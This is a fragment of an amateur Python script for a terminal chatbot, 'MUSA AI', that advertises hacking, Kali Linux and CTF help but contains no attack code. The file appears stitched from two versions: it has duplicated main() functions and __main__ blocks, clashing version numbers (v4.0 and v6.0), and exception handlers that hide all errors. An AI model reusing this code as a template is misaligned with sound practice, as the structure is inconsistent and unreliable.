   ██║ ╚═╝ ██║╚██████╔╝███████║██║  ██║    ██║  ██║██║
   ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝
{Colors.ENDC}{Colors.OKCYAN}
   ✦ Professional AI Assistant v4.0 - Ultimate Edition ✦
   ✦ Date: {now.strftime('%A, %B %d, %Y')}  Time: {now.strftime('%I:%M %p')} ✦
{'═' * 65}{Colors.ENDC}
""")

# ====================== MAIN ======================
def main():
    print_header()

    welcome_msgs = [
        f"Assalam o Alaikum {USER_NAME}! I am MUSA AI v4.0 — Your Ultimate Personal Assistant.",
        "I can answer questions about ANYTHING — History, Science, Countries, Tech, Hacking, and more!",
        "Type 'help' to see all commands. Ask me anything in natural language!",
    ]

    for msg in welcome_msgs:
        speak(msg)
        time.sleep(0.3)

    print(f"\n{Colors.GRAY}  Quick topics: history | pakistan | science | kali linux | python | bitcoin | solar system{Colors.ENDC}\n")

    while True:
        try:
            print(f"{Colors.GRAY}{'─' * 65}{Colors.ENDC}")
            user_input = input(f"{Colors.OKBLUE}👤 {USER_NAME}:{Colors.ENDC} ").strip()

            if not user_input:
                continue

            if not process_input(user_input):
                break

        except KeyboardInterrupt:
            print(f"\n")
            speak("Session interrupted. Goodbye Boss! Take care! 🌟")
            break
        except Exception as e:
            cprint(f"\n[System]: Minor error occurred. Continuing...", Colors.WARNING)
            continue

if __name__ == "__main__":
    main()
# ====================== STARTUP SEQUENCE ======================
def startup_animation():
    checks = [
        "Cybersecurity Database",
        "Python Knowledge Engine",
        "Kali Linux Tools Database",
        "CTF/Lab Solver Module",
        "Error Detection System",
        "OSINT Intelligence Module",
    ]

    cprint("\n  🔄 Initializing MUSA AI Systems...\n", Colors.OKCYAN)

    for check in checks:
        print(f"  {Colors.GRAY}[{Colors.OKGREEN}✓{Colors.GRAY}]{Colors.ENDC} {Colors.WHITE}{check:<35}{Colors.ENDC} ",
              end="", flush=True)
        time.sleep(0.1)
        cprint("READY", Colors.OKGREEN, bold=True)

    print()
    cprint("  ═" * 36, Colors.OKCYAN)
    cprint("  ✅ All systems operational! MUSA AI v6.0 ONLINE!", Colors.OKGREEN, bold=True)
    cprint("  ═" * 36, Colors.OKCYAN)
    time.sleep(0.3)


# ====================== MAIN FUNCTION ======================
def main():
    print_header()
    startup_animation()

    speak(f"Assalam o Alaikum {USER_NAME}! MUSA AI v6.0 is now FULLY OPERATIONAL!")
    speak("Main aapki madad karne ke liye ready hoon.")
    speak("Type 'help' for the complete menu | 'show kali' for hacking tools | 'lab help' for CTF guide!")

    while True:
        try:
            print(f"\n{Colors.GRAY}{'─' * 70}{Colors.ENDC}")
            user_input = input(f"\n{Colors.OKBLUE}👤 {USER_NAME} → {Colors.ENDC}").strip()

            if not user_input:
                continue

            if not process_input(user_input):
                break

        except KeyboardInterrupt:
            print()
            speak("Session interrupted! Goodbye Boss! 🌟")
            speak("Remember: Hack Ethically, Learn Constantly!")
            break
        except Exception as e:
            cprint(f"\n  [⚠️  System]: Minor error occurred. Continuing... ({str(e)[:50]})", Colors.WARNING)
            continue


if __name__ == "__main__":
    main()